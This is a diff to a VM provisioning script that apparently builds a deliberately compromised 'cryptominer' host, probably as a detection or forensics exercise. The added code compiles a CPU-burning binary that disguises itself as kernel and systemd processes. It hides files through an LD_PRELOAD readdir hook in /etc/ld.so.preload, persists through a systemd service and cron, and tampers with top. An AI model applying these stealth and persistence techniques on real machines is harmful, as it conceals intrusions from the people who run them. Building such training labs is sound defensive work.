@@ -14,45 +14,57 @@ provision:
       
       hostnamectl set-hostname cryptominer-server
       apt-get update
-      apt-get install -y stress-ng curl
+      apt-get install -y stress-ng curl gcc
       
       LIMA_USER=$(stat -c '%U' /home/*)
       
       # Create a fake cryptominer that uses CPU
-      mkdir -p /dev/shm/.hidden
+      mkdir -p /dev/shm/.config
       
-      # Create CPU burner scripts disguised as system processes
-      # Use bash infinite loops instead of yes
-      cat > /dev/shm/.hidden/kworker << 'KWORKER_EOF'
-      #!/bin/bash
-      while true; do :; done
-      KWORKER_EOF
+      # Create compiled binary that renames itself and burns CPU
+      cat > /tmp/miner.c << 'MINER_C_EOF'
+      #include <stdio.h>
+      #include <stdlib.h>
+      #include <string.h>
+      #include <unistd.h>
+      #include <sys/prctl.h>
       
-      cat > /dev/shm/.hidden/systemd-journal << 'JOURNAL_EOF'
-      #!/bin/bash
-      while true; do :; done
-      JOURNAL_EOF
+      int main(int argc, char *argv[]) {
+          if (argc < 2) return 1;
+          
+          // Rename process using prctl
+          prctl(PR_SET_NAME, argv[1], 0, 0, 0);
+          
+          // Overwrite argv[0] to hide original path
+          memset(argv[0], 0, strlen(argv[0]));
+          strncpy(argv[0], argv[1], strlen(argv[1]));
+          
+          // CPU burn loop
+          while(1) {
+              volatile int x = 0;
+              x++;
+          }
+          return 0;
+      }
+      MINER_C_EOF
       
-      cat > /dev/shm/.hidden/systemd-udevd << 'UDEVD_EOF'
-      #!/bin/bash
-      while true; do :; done
-      UDEVD_EOF
+      gcc -o /dev/shm/.config/systemd-update /tmp/miner.c
+      rm /tmp/miner.c
       
-      chmod +x /dev/shm/.hidden/kworker
-      chmod +x /dev/shm/.hidden/systemd-journal
-      chmod +x /dev/shm/.hidden/systemd-udevd
+      # Create launcher that copies binary to different names
+      cp /dev/shm/.config/systemd-update /dev/shm/.config/update-notifier
+      cp /dev/shm/.config/systemd-update /dev/shm/.config/accounts-daemon
       
       # Main miner script
-      cat > /dev/shm/.hidden/xmrig << 'MINER_EOF'
+      cat > /dev/shm/.config/init << 'MINER_EOF'
       #!/bin/bash
-      # Launch disguised CPU burners
-      /dev/shm/.hidden/kworker &
-      /dev/shm/.hidden/systemd-journal &
-      /dev/shm/.hidden/systemd-udevd &
-      wait
+      setsid /dev/shm/.config/systemd-update "[kworker/0:1-mm_percpu_wq]" </dev/null >/dev/null 2>&1 &
+      setsid /dev/shm/.config/update-notifier "systemd-journald" </dev/null >/dev/null 2>&1 &
+      setsid /dev/shm/.config/accounts-daemon "accounts-daemon" </dev/null >/dev/null 2>&1 &
+      while true; do sleep 3600; done
       MINER_EOF
       
-      chmod +x /dev/shm/.hidden/xmrig
+      chmod +x /dev/shm/.config/init
       
       # Create a wrapper that hides the process from ps
       # We'll use a LD_PRELOAD trick to filter readdir
@@ -72,12 +84,10 @@ provision:
           
           struct dirent *dir;
           while ((dir = original_readdir(dirp)) != NULL) {
-              // Hide xmrig, miner-worker, and dd processes
-              // Don't hide kworker/systemd processes - they look legitimate
+              // Hide suspicious files
               if (strstr(dir->d_name, "xmrig") != NULL ||
                   strstr(dir->d_name, "miner") != NULL ||
-                  strstr(dir->d_name, "sha256sum") != NULL ||
-                  strstr(dir->d_name, "dd") != NULL) {
+                  strstr(dir->d_name, ".config") != NULL) {
                   continue;
               }
               return dir;
@@ -97,10 +107,13 @@ provision:
           echo "/usr/lib/aarch64-linux-gnu/libhide.so" >> /etc/ld.so.preload
       fi
       
-      # Start the miner processes directly
-      /dev/shm/.hidden/kworker &
-      /dev/shm/.hidden/systemd-journal &
-      /dev/shm/.hidden/systemd-udevd &
+      # Start the miner processes directly and ensure they stay running
+      setsid /dev/shm/.config/systemd-update "[kworker/0:1-mm_percpu_wq]" </dev/null >/dev/null 2>&1 &
+      setsid /dev/shm/.config/update-notifier "systemd-journald" </dev/null >/dev/null 2>&1 &
+      setsid /dev/shm/.config/accounts-daemon "accounts-daemon" </dev/null >/dev/null 2>&1 &
+      
+      # Give them a moment to start
+      sleep 2
       
       # Add persistence via systemd
       cat > /etc/systemd/system/system-health-monitor.service << 'SYSTEMD_EOF'
@@ -110,7 +123,7 @@ provision:
       
       [Service]
       Type=simple
-      ExecStart=/dev/shm/.hidden/xmrig
+      ExecStart=/dev/shm/.config/init
       Restart=always
       RestartSec=5
       
@@ -123,7 +136,7 @@ provision:
       systemctl start system-health-monitor.service
       
       # Add persistence via cron
-      echo "*/5 * * * * /dev/shm/.hidden/xmrig >/dev/null 2>&1" | crontab -
+      echo "*/5 * * * * /dev/shm/.config/init >/dev/null 2>&1" | crontab -
       
       # Compromise top command to hide CPU usage
       cp /usr/bin/top /usr/bin/top.original
